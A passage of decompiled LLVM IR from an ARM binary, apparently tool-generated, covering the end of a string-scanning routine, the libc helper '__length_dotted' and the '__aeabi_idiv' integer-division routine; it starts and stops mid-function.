  %v1_1abf439 = load i32, i32* %r1.global-to-local, align 4
  %v2_1abf440 = add i32 %v1_1abf439, %v0_1abf4.pre.pre
  %v3_1abf441 = inttoptr i32 %v2_1abf440 to i8*
  %v4_1abf442 = load i8, i8* %v3_1abf441, align 1
  %v6_1abf443 = zext i8 %v4_1abf442 to i32
  store i32 %v6_1abf443, i32* @r4, align 4
  %v2_1abf844 = icmp eq i8 %v4_1abf442, 0
  %v2_1ac0046 = icmp eq i32 %v0_1ac00.pre.pre, 0
  br i1 %v2_1abf844, label %dec_label_pc_1ac00, label %dec_label_pc_1ab78.lr.ph

dec_label_pc_1ab78.lr.ph:                         ; preds = %dec_label_pc_1abf4.preheader, %bb34
  %v2_1ac004663 = phi i1 [ %v2_1ac0046, %bb34 ], [ false, %dec_label_pc_1abf4.preheader ]
  %v6_1abf44361 = phi i32 [ %v6_1abf443, %bb34 ], [ %v6_1abf44356, %dec_label_pc_1abf4.preheader ]
  %v1_1abf43960 = phi i32 [ %v1_1abf439, %bb34 ], [ %v1_1abf43952, %dec_label_pc_1abf4.preheader ]
  %v0_1ab90.ph59 = phi i32 [ %v0_1abf4.pre.pre, %bb34 ], [ %v0_1ab54, %dec_label_pc_1abf4.preheader ]
  %storemerge17.ph58 = phi i32 [ %v0_1abf0.pre, %bb34 ], [ 0, %dec_label_pc_1abf4.preheader ]
  br label %dec_label_pc_1ab78

dec_label_pc_1ac00:                               ; preds = %bb34
  br i1 %v2_1ac0046, label %dec_label_pc_1ac00.bb36_crit_edge, label %bb35

dec_label_pc_1ac00.bb36_crit_edge:                ; preds = %bb30, %dec_label_pc_1ac00
  %v0_1ac08.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1ac14

bb35:                                             ; preds = %dec_label_pc_1abf4.preheader, %dec_label_pc_1ac00
  %v1_1ac04 = load i32, i32* %r8.global-to-local, align 4
  %v2_1ac04 = add i32 %v1_1ac04, 1
  store i32 %v2_1ac04, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1ac14

dec_label_pc_1ac14:                               ; preds = %dec_label_pc_1abb0, %bb35, %dec_label_pc_1ac00.bb36_crit_edge, %.thread16
  %storemerge = phi i32 [ -1, %.thread16 ], [ %v0_1ac08.pre, %dec_label_pc_1ac00.bb36_crit_edge ], [ %v2_1ac04, %bb35 ], [ -1, %dec_label_pc_1abb0 ]
  store i32 %v3_1ab50, i32* @r4, align 4
  store i32 %v6_1ab50, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge17.ph58, { 2, 1, 0 }
  uselistorder i32 %v0_1ab90.ph59, { 2, 0, 1 }
  uselistorder i32 %v6_1abf4, { 1, 0 }
  uselistorder i32 %v5_1aba0, { 0, 2, 1 }
  uselistorder i32 %v6_1abf448, { 2, 1, 0, 3 }
  uselistorder i1 %v2_1ac0050, { 1, 0 }
  uselistorder i32 %v0_1ab54, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-40, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 8, 1, 5, 2, 6, 3, 7, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 0, 3 }
  uselistorder i1 false, { 0, 8, 40, 36, 41, 42, 43, 44, 45, 2, 75, 4, 46, 13, 47, 48, 49, 12, 50, 51, 53, 54, 55, 56, 57, 58, 59, 52, 15, 60, 28, 16, 29, 61, 62, 63, 18, 17, 9, 10, 64, 65, 66, 11, 19, 67, 30, 31, 68, 32, 33, 20, 37, 38, 5, 21, 69, 34, 35, 70, 71, 14, 22, 72, 73, 74, 39, 76, 1, 25, 24, 26, 23, 6, 7, 27, 3, 77 }
  uselistorder i8 46, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 ()* @memcpy, { 11, 10, 19, 9, 8, 7, 6, 2, 17, 16, 1, 0, 18, 5, 15, 14, 13, 20, 12, 4, 3 }
  uselistorder i32 64, { 0, 8, 4, 5, 6, 1, 2, 11, 12, 7, 3, 9, 10, 14, 13 }
  uselistorder i32* @r3, { 11, 0, 12, 13, 3, 4, 14, 5, 6, 7, 8, 1, 2, 17, 20, 18, 19, 15, 9, 10, 16, 21 }
  uselistorder i32* @r2, { 89, 90, 10, 91, 92, 93, 94, 11, 25, 26, 27, 95, 96, 97, 74, 6, 75, 98, 12, 53, 99, 108, 109, 110, 111, 76, 77, 13, 7, 144, 145, 146, 147, 54, 55, 2, 56, 57, 58, 101, 102, 8, 59, 15, 16, 148, 3, 149, 154, 155, 159, 130, 39, 40, 41, 42, 43, 150, 132, 136, 137, 140, 138, 139, 133, 134, 135, 29, 129, 14, 112, 156, 19, 78, 60, 61, 62, 100, 1, 157, 5, 158, 63, 64, 65, 66, 9, 67, 68, 4, 69, 0, 70, 103, 104, 105, 106, 71, 72, 107, 17, 18, 28, 151, 152, 153, 30, 31, 32, 33, 34, 35, 36, 37, 38, 44, 45, 46, 47, 48, 49, 50, 51, 52, 73, 79, 80, 81, 82, 83, 84, 85, 86, 20, 21, 22, 23, 24, 87, 88, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 131, 141, 142, 143 }
  uselistorder i32* @r5, { 173, 174, 175, 176, 177, 178, 179, 8, 180, 181, 182, 183, 184, 185, 186, 5, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 26, 37, 9, 3, 38, 203, 207, 204, 205, 206, 22, 212, 208, 209, 210, 211, 213, 214, 215, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 10, 91, 92, 216, 220, 11, 222, 221, 4, 223, 12, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 252, 251, 24, 253, 165, 166, 167, 168, 169, 170, 295, 296, 93, 94, 95, 96, 97, 98, 99, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 100, 101, 0, 102, 103, 104, 105, 106, 107, 309, 310, 311, 312, 1, 313, 314, 315, 156, 157, 158, 159, 160, 161, 39, 40, 41, 42, 43, 44, 45, 171, 13, 7, 172, 46, 47, 50, 51, 52, 53, 54, 55, 56, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 162, 163, 164, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 268, 269, 14, 270, 317, 318, 319, 320, 108, 15, 109, 110, 111, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 112, 16, 113, 114, 115, 116, 117, 17, 226, 227, 228, 18, 224, 225, 57, 58, 59, 229, 230, 231, 118, 119, 27, 120, 121, 19, 122, 123, 124, 125, 126, 127, 25, 128, 129, 130, 131, 28, 135, 20, 136, 137, 138, 139, 140, 141, 142, 143, 6, 144, 145, 146, 147, 148, 149, 35, 36, 132, 2, 133, 134, 49, 48, 23, 321, 322, 232, 233, 234, 235, 21, 236, 237, 150, 151, 152, 153, 154, 155, 217, 218, 219, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 316, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 29, 30, 31, 32, 33, 34, 265, 266, 267 }
  uselistorder label %dec_label_pc_1ac14, { 1, 2, 0, 3 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %dec_label_pc_1ac00.bb36_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1ab78.lr.ph, { 1, 0 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %bb32, { 1, 0 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %v0_1ac20 = load i32, i32* @r0, align 4
  store i32 %v0_1ac20, i32* @lr, align 4
  %v2_1ac20 = icmp eq i32 %v0_1ac20, 0
  br i1 %v2_1ac20, label %bb, label %dec_label_pc_1ac38

bb:                                               ; preds = %entry
  ret i32 -1

dec_label_pc_1ac30:                               ; preds = %dec_label_pc_1ac40
  %v1_1ac30 = add i32 %v1_1ac48, 2
  br label %dec_label_pc_1ac60

dec_label_pc_1ac38:                               ; preds = %entry
  %v0_1ac38 = load i32, i32* @r1, align 4
  br label %dec_label_pc_1ac48

dec_label_pc_1ac40:                               ; preds = %dec_label_pc_1ac48
  %v1_1ac54 = and i32 %v6_1ac48, 192
  %v2_1ac58 = add i32 %v6_1ac48, %v1_1ac4c
  %v2_1ac40 = icmp eq i32 %v1_1ac54, 192
  br i1 %v2_1ac40, label %dec_label_pc_1ac30, label %dec_label_pc_1ac48

dec_label_pc_1ac48:                               ; preds = %dec_label_pc_1ac40, %dec_label_pc_1ac38
  %v1_1ac48 = phi i32 [ %v2_1ac58, %dec_label_pc_1ac40 ], [ %v0_1ac38, %dec_label_pc_1ac38 ]
  %v2_1ac48 = add i32 %v1_1ac48, %v0_1ac20
  %v3_1ac48 = inttoptr i32 %v2_1ac48 to i8*
  %v4_1ac48 = load i8, i8* %v3_1ac48, align 1
  %v6_1ac48 = zext i8 %v4_1ac48 to i32
  %v1_1ac4c = add i32 %v1_1ac48, 1
  %v2_1ac50 = icmp eq i8 %v4_1ac48, 0
  br i1 %v2_1ac50, label %dec_label_pc_1ac60, label %dec_label_pc_1ac40

dec_label_pc_1ac60:                               ; preds = %dec_label_pc_1ac48, %dec_label_pc_1ac30
  %v1_1ac60 = phi i32 [ %v1_1ac30, %dec_label_pc_1ac30 ], [ %v1_1ac4c, %dec_label_pc_1ac48 ]
  %v2_1ac60 = sub i32 %v1_1ac60, %v0_1ac38
  ret i32 %v2_1ac60

; uselistorder directives
  uselistorder i32 %v6_1ac48, { 1, 0 }
  uselistorder i32 %v1_1ac48, { 2, 1, 0 }
  uselistorder i32 %v0_1ac20, { 0, 2, 1 }
  uselistorder i8 0, { 65, 16, 24, 25, 66, 15, 21, 67, 47, 71, 69, 46, 70, 68, 45, 39, 8, 9, 72, 73, 77, 78, 23, 61, 62, 74, 75, 76, 14, 79, 40, 48, 81, 80, 49, 41, 82, 83, 84, 85, 86, 87, 10, 52, 91, 0, 89, 88, 50, 1, 90, 51, 2, 92, 93, 26, 3, 95, 94, 53, 96, 97, 98, 99, 42, 43, 101, 102, 100, 11, 12, 13, 103, 4, 27, 104, 17, 105, 106, 18, 63, 28, 29, 5, 107, 108, 109, 111, 112, 113, 114, 110, 44, 115, 116, 117, 118, 119, 19, 30, 31, 32, 33, 34, 120, 121, 35, 22, 6, 7, 123, 122, 36, 124, 125, 37, 126, 54, 20, 127, 128, 129, 130, 132, 55, 133, 134, 131, 135, 136, 137, 138, 140, 139, 141, 64, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 156, 155, 158, 157, 159, 56, 161, 160, 38, 162, 57, 163, 165, 166, 164, 58, 167, 168, 60, 169, 59, 170, 171, 172, 173, 174, 175 }
  uselistorder i32 192, { 0, 4, 1, 5, 2, 3, 6 }
  uselistorder i32* @r1, { 101, 102, 1, 103, 104, 105, 108, 106, 107, 9, 10, 22, 109, 110, 111, 112, 113, 114, 115, 116, 3, 117, 118, 60, 119, 120, 121, 122, 125, 128, 129, 130, 131, 132, 133, 4, 90, 91, 13, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 6, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 5, 205, 206, 11, 123, 124, 61, 62, 63, 64, 65, 66, 67, 68, 69, 14, 19, 20, 207, 2, 208, 82, 83, 147, 32, 33, 210, 148, 153, 154, 157, 155, 156, 149, 150, 151, 152, 23, 209, 84, 15, 134, 140, 144, 143, 211, 212, 213, 70, 71, 72, 16, 145, 17, 73, 135, 136, 137, 138, 139, 7, 85, 86, 8, 12, 74, 75, 76, 0, 77, 78, 79, 18, 126, 127, 80, 81, 21, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 87, 88, 89, 92, 93, 94, 95, 96, 97, 98, 99, 100, 141, 142, 146, 158 }
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1ac68 = icmp slt i32 %arg2, 0
  %v2_1ac68 = icmp eq i32 %arg2, 0
  %v0_1ac6c = load i32, i32* @r0, align 4
  %v2_1ac6c = xor i32 %v0_1ac6c, %arg2
  br i1 %v2_1ac68, label %dec_label_pc_1ad80, label %dec_label_pc_1ac74

dec_label_pc_1ac74:                               ; preds = %entry
  br i1 %v1_1ac68, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_1ac74
  %v2_1ac74 = sub i32 0, %arg2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_1ac74, %bb
  %v1_1ad40 = phi i32 [ %v2_1ac74, %bb ], [ %arg2, %dec_label_pc_1ac74 ]
  %v1_1ac78 = add i32 %v1_1ad40, -1
  %v7_1ac78 = icmp eq i32 %v1_1ad40, 1
  br i1 %v7_1ac78, label %dec_label_pc_1ad20, label %dec_label_pc_1ac80

dec_label_pc_1ac80:                               ; preds = %thread-pre-split
  %v1_1ac80 = icmp slt i32 %v0_1ac6c, 0
  br i1 %v1_1ac80, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_1ac80
  %v2_1ac84 = sub i32 0, %v0_1ac6c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_1ac80, %bb85
  %v0_1ad74 = phi i32 [ %v0_1ac6c, %dec_label_pc_1ac80 ], [ %v2_1ac84, %bb85 ]
  %v3_1ac88 = icmp uge i32 %v0_1ad74, %v1_1ad40
  %v9_1ac88 = icmp eq i32 %v0_1ad74, %v1_1ad40
  %v2_1ac8c = xor i1 %v3_1ac88, true
  %v3_1ac8c = or i1 %v9_1ac88, %v2_1ac8c
  br i1 %v3_1ac8c, label %dec_label_pc_1ad2c, label %dec_label_pc_1ac90

dec_label_pc_1ac90:                               ; preds = %bb86
  %v2_1ac90 = and i32 %v1_1ac78, %v1_1ad40
  %v4_1ac90 = icmp eq i32 %v2_1ac90, 0
  br i1 %v4_1ac90, label %dec_label_pc_1ad3c, label %dec_label_pc_1ac98

dec_label_pc_1ac98:                               ; preds = %dec_label_pc_1ac90
  %v3_1ac98 = icmp ult i32 %v1_1ad40, 536870912
  br i1 %v3_1ac98, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1ac98
  %v4_1ac9c = mul i32 %v1_1ad40, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1ac98, %.thread
  %v0_1acbc.pr40.ph = phi i32 [ %v4_1ac9c, %.thread ], [ %v1_1ad40, %dec_label_pc_1ac98 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1ac98 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_1acbc.pr40 = phi i32 [ %v4_1acb0, %bb89 ], [ %v0_1acbc.pr40.ph, %.preheader.preheader ]
  %v1_1acb4 = phi i32 [ %v4_1acb4, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1aca8 = icmp ugt i32 %v0_1acbc.pr40, 268435455
  br i1 %v2_1aca8, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_1acbcthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_1acac = icmp ult i32 %v0_1acbc.pr40, %v0_1ad74
  br i1 %v4_1acac, label %bb88, label %dec_label_pc_1acbcthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_1acb0 = and i32 %v0_1acbc.pr40, 268435456
  %v3_1acb0 = icmp eq i32 %v2_1acb0, 0
  %v4_1acb0 = mul i32 %v0_1acbc.pr40, 16
  br i1 %v3_1acb0, label %bb89, label %dec_label_pc_1acbc.loopexit

bb89:                                             ; preds = %bb88
  %v2_1acb4 = and i32 %v1_1acb4, 268435456
  %v3_1acb4 = icmp eq i32 %v2_1acb4, 0
  %v4_1acb4 = mul i32 %v1_1acb4, 16
  br i1 %v3_1acb4, label %.preheader, label %dec_label_pc_1acbcthread-pre-split.loopexit.loopexit

dec_label_pc_1acbcthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1acc852.ph = phi i32 [ %v1_1acb4, %bb87 ], [ %v4_1acb4, %bb89 ]
  %v0_1acbc.pr42.ph = phi i32 [ %v0_1acbc.pr40, %bb87 ], [ %v4_1acb0, %bb89 ]
  br label %dec_label_pc_1acbcthread-pre-split.loopexit

dec_label_pc_1acbcthread-pre-split.loopexit:      ; preds = %dec_label_pc_1acbcthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1acc852 = phi i32 [ %v1_1acb4, %.thread3 ], [ %v1_1acc852.ph, %dec_label_pc_1acbcthread-pre-split.loopexit.loopexit ]
  %v0_1acbc.pr42 = phi i32 [ %v0_1acbc.pr40, %.thread3 ], [ %v0_1acbc.pr42.ph, %dec_label_pc_1acbcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1acbcthread-pre-split

dec_label_pc_1acbcthread-pre-split:               ; preds = %dec_label_pc_1acbcthread-pre-split.loopexit, %bb91
  %v1_1acc850 = phi i32 [ %v1_1acc852, %dec_label_pc_1acbcthread-pre-split.loopexit ], [ %v3_1acc8, %bb91 ]
  %v2_1acc048 = phi i32 [ %v0_1ad74, %dec_label_pc_1acbcthread-pre-split.loopexit ], [ %v2_1acc0, %bb91 ]
  %v0_1acbc.pr = phi i32 [ %v0_1acbc.pr42, %dec_label_pc_1acbcthread-pre-split.loopexit ], [ %v3_1acc4, %bb91 ]
  br label %dec_label_pc_1acbc

dec_label_pc_1acbc.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1acbc

dec_label_pc_1acbc:                               ; preds = %dec_label_pc_1acbc.loopexit, %dec_label_pc_1acbcthread-pre-split
  %v1_1acc8 = phi i32 [ %v1_1acc850, %dec_label_pc_1acbcthread-pre-split ], [ %v1_1acb4, %dec_label_pc_1acbc.loopexit ]
  %v2_1acc0 = phi i32 [ %v2_1acc048, %dec_label_pc_1acbcthread-pre-split ], [ %v0_1ad74, %dec_label_pc_1acbc.loopexit ]
  %v1_1acc4 = phi i32 [ %v0_1acbc.pr, %dec_label_pc_1acbcthread-pre-split ], [ %v4_1acb0, %dec_label_pc_1acbc.loopexit ]
  %v2_1acbc = icmp slt i32 %v1_1acc4, 0
  br i1 %v2_1acbc, label %dec_label_pc_1acd0, label %bb90

bb90:                                             ; preds = %dec_label_pc_1acbc
  %v4_1acc0 = icmp ult i32 %v1_1acc4, %v2_1acc0
  br i1 %v4_1acc0, label %bb91, label %dec_label_pc_1acd0

bb91:                                             ; preds = %bb90
  %v3_1acc4 = mul i32 %v1_1acc4, 2
  %v2_1acc8 = icmp slt i32 %v1_1acc8, 0
  %v3_1acc8 = mul i32 %v1_1acc8, 2
  br i1 %v2_1acc8, label %dec_label_pc_1acd0, label %dec_label_pc_1acbcthread-pre-split

dec_label_pc_1acd0:                               ; preds = %bb90, %dec_label_pc_1acbc, %bb91
  %v2_1acdc63 = phi i32 [ %v3_1acc8, %bb91 ], [ %v1_1acc8, %bb90 ], [ %v1_1acc8, %dec_label_pc_1acbc ]
  %v1_1acd455 = phi i32 [ %v3_1acc4, %bb91 ], [ %v1_1acc4, %bb90 ], [ %v1_1acc4, %dec_label_pc_1acbc ]
  br label %dec_label_pc_1acd4

dec_label_pc_1acd4:                               ; preds = %.thread13, %dec_label_pc_1acd0
  %v1_1ad08 = phi i32 [ %v4_1ad08, %.thread13 ], [ %v2_1acdc63, %dec_label_pc_1acd0 ]
  %v1_1acdc = phi i32 [ %v1_1ad18, %.thread13 ], [ 0, %dec_label_pc_1acd0 ]
  %v1_1ad0c = phi i32 [ %v4_1ad0c, %.thread13 ], [ %v1_1acd455, %dec_label_pc_1acd0 ]
  %v1_1acd8 = phi i32 [ %v0_1ad04, %.thread13 ], [ %v0_1ad74, %dec_label_pc_1acd0 ]
  %v3_1acd4 = icmp ult i32 %v1_1acd8, %v1_1ad0c
  br i1 %v3_1acd4, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1acd4
  %v3_1acd8 = sub i32 %v1_1acd8, %v1_1ad0c
  %v3_1acdc = or i32 %v1_1acdc, %v1_1ad08
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1acd4, %bb92
  %v1_1ace4 = phi i32 [ %v1_1acd8, %dec_label_pc_1acd4 ], [ %v3_1acd8, %bb92 ]
  %v1_1ace8 = phi i32 [ %v1_1acdc, %dec_label_pc_1acd4 ], [ %v3_1acdc, %bb92 ]
  %v4_1ace0 = udiv i32 %v1_1ad0c, 2
  %v6_1ace0 = icmp ult i32 %v1_1ace4, %v4_1ace0
  br i1 %v6_1ace0, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1ace4 = urem i32 %v1_1ad0c, 2
  %v4_1ace4 = icmp eq i32 %v3_1ace4, 0
  %v6_1ace4 = sub i32 %v1_1ace4, %v4_1ace0
  br i1 %v4_1ace4, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1ace8 = udiv i32 %v1_1ad08, 2
  %v6_1ace8 = or i32 %v1_1ace8, %v5_1ace8
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1acf0 = phi i32 [ %v6_1ace4, %bb93 ], [ %v1_1ace4, %.thread8 ], [ %v6_1ace4, %bb94 ]
  %v1_1acf4 = phi i32 [ %v1_1ace8, %bb93 ], [ %v1_1ace8, %.thread8 ], [ %v6_1ace8, %bb94 ]
  %v4_1acec = udiv i32 %v1_1ad0c, 4
  %v6_1acec = icmp ult i32 %v1_1acf0, %v4_1acec
  br i1 %v6_1acec, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1acf0 = and i32 %v1_1ad0c, 2
  %v4_1acf0 = icmp eq i32 %v3_1acf0, 0
  %v6_1acf0 = sub i32 %v1_1acf0, %v4_1acec
  br i1 %v4_1acf0, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1acf4 = udiv i32 %v1_1ad08, 4
  %v6_1acf4 = or i32 %v1_1acf4, %v5_1acf4
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1acfc = phi i32 [ %v6_1acf0, %bb95 ], [ %v1_1acf0, %.thread9 ], [ %v6_1acf0, %bb96 ]
  %v1_1ad00 = phi i32 [ %v1_1acf4, %bb95 ], [ %v1_1acf4, %.thread9 ], [ %v6_1acf4, %bb96 ]
  %v4_1acf8 = udiv i32 %v1_1ad0c, 8
  %v6_1acf8 = icmp ult i32 %v1_1acfc, %v4_1acf8
  br i1 %v6_1acf8, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1acfc = and i32 %v1_1ad0c, 4
  %v4_1acfc = icmp eq i32 %v3_1acfc, 0
  %v6_1acfc = sub i32 %v1_1acfc, %v4_1acf8
  br i1 %v4_1acfc, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1ad00 = udiv i32 %v1_1ad08, 8
  %v6_1ad00 = or i32 %v1_1ad00, %v5_1ad00
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1ad18 = phi i32 [ %v1_1ad00, %bb97 ], [ %v1_1ad00, %.thread10 ], [ %v6_1ad00, %bb98 ]
  %v0_1ad04 = phi i32 [ %v6_1acfc, %bb97 ], [ %v1_1acfc, %.thread10 ], [ %v6_1acfc, %bb98 ]
  %v2_1ad04 = icmp eq i32 %v0_1ad04, 0
  br i1 %v2_1ad04, label %dec_label_pc_1ad14, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1ad08, 16
  br i1 %tmp, label %dec_label_pc_1ad14, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1ad08 = udiv i32 %v1_1ad08, 16
  %v4_1ad0c = udiv i32 %v1_1ad0c, 16
  br label %dec_label_pc_1acd4

dec_label_pc_1ad14:                               ; preds = %thread-pre-split12, %bb99
  %v1_1ad14 = icmp slt i32 %v2_1ac6c, 0
  br i1 %v1_1ad14, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1ad14
  %v2_1ad18 = sub i32 0, %v1_1ad18
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1ad20, %dec_label_pc_1ad14, %bb100
  %v1_1ad1c = phi i32 [ %v1_1ad18, %dec_label_pc_1ad14 ], [ %v2_1ad18, %bb100 ], [ %v0_1ac6c, %dec_label_pc_1ad20 ], [ %v2_1ad24, %bb101 ], [ %v1_1ad3880, %bb103 ], [ %v2_1ad34, %bb104 ]
  ret i32 %v1_1ad1c

dec_label_pc_1ad20:                               ; preds = %thread-pre-split
  br i1 %v1_1ac68, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1ad20
  %v2_1ad24 = sub i32 0, %v0_1ac6c
  br label %.thread16

dec_label_pc_1ad2c:                               ; preds = %bb86
  br i1 %v3_1ac88, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1ad2c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1ad2c, %bb102
  %v1_1ad3880 = phi i32 [ %v0_1ac6c, %dec_label_pc_1ad2c ], [ 0, %bb102 ]
  br i1 %v9_1ac88, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1ad30 = ashr i32 %v2_1ac6c, 31
  %v2_1ad34 = or i32 %v4_1ad30, 1
  br label %.thread16

dec_label_pc_1ad3c:                               ; preds = %dec_label_pc_1ac90
  %v2_1ad3c = icmp ugt i32 %v1_1ad40, 65535
  br i1 %v2_1ad3c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1ad3c
  %v2_1ad40 = and i32 %v1_1ad40, 32768
  %v3_1ad40 = icmp eq i32 %v2_1ad40, 0
  %v4_1ad40 = udiv i32 %v1_1ad40, 65536
  br i1 %v3_1ad40, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1ad3c
  %v0_1ad4c70 = phi i32 [ %v1_1ad40, %dec_label_pc_1ad3c ], [ %v4_1ad40, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1ad50 = phi i32 [ %v0_1ad4c70, %.thread19 ], [ %v4_1ad40, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1ad4c = icmp ugt i32 %v1_1ad50, 255
  br i1 %v2_1ad4c, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1ad50 = and i32 %v1_1ad50, 128
  %v3_1ad50 = icmp eq i32 %v2_1ad50, 0
  %v4_1ad50 = udiv i32 %v1_1ad50, 256
  br i1 %v3_1ad50, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1ad54 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1ad60 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1ad54, %bb108 ]
  %v1_1ad5c = phi i32 [ %v1_1ad50, %bb106 ], [ %v4_1ad50, %bb107 ], [ %v4_1ad50, %bb108 ]
  %v2_1ad58 = icmp ugt i32 %v1_1ad5c, 15
  br i1 %v2_1ad58, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1ad5c = and i32 %v1_1ad5c, 8
  %v3_1ad5c = icmp eq i32 %v2_1ad5c, 0
  %v4_1ad5c = udiv i32 %v1_1ad5c, 16
  br i1 %v3_1ad5c, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1ad60 = add nsw i32 %v1_1ad60, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1ad68 = phi i32 [ %v1_1ad60, %.thread20 ], [ %v1_1ad60, %bb109 ], [ %v2_1ad60, %bb110 ]
  %v5_1ad6c = phi i32 [ %v1_1ad5c, %.thread20 ], [ %v4_1ad5c, %bb109 ], [ %v4_1ad5c, %bb110 ]
  %v2_1ad64 = icmp ugt i32 %v5_1ad6c, 3
  %v7_1ad64 = icmp eq i32 %v5_1ad6c, 4
  %v2_1ad68 = xor i1 %v7_1ad64, true
  %v3_1ad68 = and i1 %v2_1ad64, %v2_1ad68
  br i1 %v3_1ad68, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1ad68 = add nsw i32 %v4_1ad68, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1ad6c = phi i32 [ %v4_1ad68, %.thread21 ], [ %v5_1ad68, %bb111 ]
  %v2_1ad6c = xor i1 %v2_1ad64, true
  %v3_1ad6c = or i1 %v7_1ad64, %v2_1ad6c
  br i1 %v3_1ad6c, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1ad6c = udiv i32 %v5_1ad6c, 2
  %v9_1ad6c = add i32 %v4_1ad6c, %v8_1ad6c
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1ad74 = phi i32 [ %v4_1ad6c, %bb112 ], [ %v9_1ad6c, %bb113 ]
  %v1_1ad70 = icmp slt i32 %v2_1ac6c, 0
  %v6_1ad74 = lshr i32 %v0_1ad74, %v1_1ad74
  %v2_1ad78 = sub i32 0, %v6_1ad74
